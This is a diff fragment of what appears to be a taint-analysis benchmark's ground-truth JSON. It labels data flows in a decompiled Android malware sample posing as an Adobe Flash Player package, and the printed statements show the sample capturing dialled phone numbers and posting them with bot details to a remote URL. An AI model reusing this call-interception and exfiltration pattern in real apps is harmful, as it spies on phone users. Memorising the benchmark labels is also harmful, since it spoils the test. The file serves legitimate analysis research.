+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 39,
+          "ID": 3
+        },
+        {
+          "statement": "int bytesRead = fileInputStream.read(buffer, 0, bufferSize);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 55,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 19,
+      "description": "This malicious flow writes phone number to a file and the file content is posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 86,
+        "decompiledSourceLineNo": 55,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, bufferSize);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 58,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.DataOutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new FlashVirtual().execute(new String[]{\"&b=\" + BotID + \"&c=\" + BotNetwork.replace(\":\", \"\") + \"&d=\" + BotLocation + \"&e=\" + readConfig(\"BotPhone\", context) + \"&f=\" + BotVer + \"&g=\" + SDK + \"&h=blocked_call&i=\" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(\".txt\").toString()).toString(), URL});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashZ",
+          "lineNo": 87,
+          "decompiledSourceLineNo": 56,
+          "ID": 1
+        },
+        {
+          "statement": "String exsistingFileName = params[1];",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 27,
+          "ID": 2
+        },
+        {
+          "statement": "FileInputStream fileInputStream = new FileInputStream(new File(exsistingFileName));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 39,
+          "ID": 3
+        },
+        {
+          "statement": "int bytesRead = fileInputStream.read(buffer, 0, bufferSize);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 55,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 20,
+      "description": "This malicious flow writes phone number to a file and the file content is posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\") + \"\\n\", new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 115,
+        "decompiledSourceLineNo": 67,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, bufferSize);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 58,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.DataOutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new FlashVirtual().execute(new String[]{\"&b=\" + BotID + \"&c=\" + BotNetwork.replace(\":\", \"\") + \"&d=\" + BotLocation + \"&e=\" + readConfig(\"BotPhone\", context) + \"&f=\" + BotVer + \"&g=\" + SDK + \"&h=blocked_call&i=\" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(\".txt\").toString()).toString(), URL});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashZ",
+          "lineNo": 116,
+          "decompiledSourceLineNo": 68,
+          "ID": 1
+        },
+        {
+          "statement": "String exsistingFileName = params[1];",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 27,
+          "ID": 2
+        },
+        {
+          "statement": "FileInputStream fileInputStream = new FileInputStream(new File(exsistingFileName));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 39,
+          "ID": 3
+        },
+        {
+          "statement": "int bytesRead = fileInputStream.read(buffer, 0, bufferSize);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 55,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 21,
+      "description": "This malicious flow writes phone number to a file and the file content is posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "saveData(\"\" + intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\"), new StringBuilder(String.valueOf(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").replace(\"+\", \"\").replace(\"*\", \"S\").replace(\"#\", \"W\"))).append(\".txt\").toString(), context);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 137,
+        "decompiledSourceLineNo": 75,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, bufferSize);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 58,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.DataOutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "new FlashVirtual().execute(new String[]{\"&b=\" + BotID + \"&c=\" + BotNetwork.replace(\":\", \"\") + \"&d=\" + BotLocation + \"&e=\" + readConfig(\"BotPhone\", context) + \"&f=\" + BotVer + \"&g=\" + SDK + \"&h=out_call&i=\" + ho, context.getFileStreamPath(new StringBuilder(String.valueOf(ho)).append(\".txt\").toString()).toString(), URL});",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.adobe.flashplayer_.FlashZ",
+          "lineNo": 71,
+          "decompiledSourceLineNo": 76,
+          "ID": 1
+        },
+        {
+          "statement": "String exsistingFileName = params[1];",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 27,
+          "ID": 2
+        },
+        {
+          "statement": "FileInputStream fileInputStream = new FileInputStream(new File(exsistingFileName));",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 39,
+          "ID": 3
+        },
+        {
+          "statement": "int bytesRead = fileInputStream.read(buffer, 0, bufferSize);",
+          "methodName": "public String doInBackground(String... params)",
+          "className": "com.adobe.flashplayer_.FlashVirtual",
+          "lineNo": 55,
+          "ID": 4
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "array": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 22,
+      "description": "This malicious flow writes phone number to a file and the file content is posted to a remote server.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "if (intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").indexOf(indexOf) != -1) {",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 71,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, bufferSize);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 58,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.DataOutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 23,
+      "description": "Negative flow",
+      "isNegative": true
+    },
+    {
+      "source": {
+        "statement": "} else if (!(intent.getStringExtra(\"android.intent.extra.PHONE_NUMBER\").indexOf(cvadi) == -1 || cvadi == \"\" || sa || getResultData() == null)) {",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.adobe.flashplayer_.FlashZ",
+        "lineNo": 101,
+        "targetName": "getStringExtra",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r11 = virtualinvoke $r2.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>(\"android.intent.extra.PHONE_NUMBER\")"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "dos.write(buffer, 0, bufferSize);",
+        "methodName": "public String doInBackground(String... params)",
+        "className": "com.adobe.flashplayer_.FlashVirtual",
+        "lineNo": 58,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r3.<java.io.DataOutputStream: void write(byte[],int,int)>($r2, 0, $i0)"
+          }
+        ]
+      },
+      "intermediateFlows": [],
+      "attributes": {},
+      "ID": 24,
+      "description": "Negative flow",
+      "isNegative": true
+    }
+  ]
+}
